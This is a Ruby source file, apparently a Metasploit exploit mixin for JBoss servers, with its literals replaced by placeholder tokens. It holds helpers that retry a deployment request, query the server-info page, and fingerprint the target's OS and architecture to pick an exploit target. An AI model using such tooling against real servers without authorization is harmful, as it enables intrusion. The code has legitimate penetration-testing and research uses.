module Msf::Exploit::Remote::HTTP::JBoss::Base def deploy ( opts = { } , num_attempts = <int> ) uri = opts [ <str> ] if uri . blank? return nil end num_attempts . times do | attempt | res = send_request_cgi ( opts , <int> ) msg = nil if res . nil? msg = <str> uri <str> elsif res . code == <int> vprint_status ( <str> uri <str> ) return res else msg = <str> uri <str> res . code <str> end if attempt < num_attempts - <int> msg << <str> vprint_status ( msg ) Rex . sleep ( <int> ) else print_error ( msg ) return res end end end def http_verb datastore [ <str> ] end def auto_target ( available_targets ) if http_verb == <str> print_status ( <str> ) else print_status ( <str> ) res = query_serverinfo plat = detect_platform ( res ) unless plat print_warning ( <str> ) return nil end arch = detect_architecture ( res ) unless arch print_warning ( <str> ) return nil end available_targets . each { | t | return t if t [ <str> ] == plat && t [ <str> ] == arch } end java_targets = available_targets . select { | t | t . name =~ <str> } java_targets [ <int> ] end def query_serverinfo path = normalize_uri ( target_uri . path . to_s , <str> ) res = send_request_cgi ( { <str> = > path , <str> = > http_verb , <str> = > { <str> = > <str> , <str> = > <str> } } ) unless res && res . code == <int> print_error ( <str> path <str> ) return nil end res end def detect_platform ( res ) if res && res . body =~ <str> os = $1 if ( os =~ <str> ) return <str> elsif ( os =~ <str> ) return <str> elsif ( os =~ <str> ) return <str> end end nil end def detect_architecture ( res ) if res && res . body =~ <str> arch = $1 if arch =~ <str> return ARCH_X86 elsif arch =~ <str> return ARCH_X86 end end nil end end 
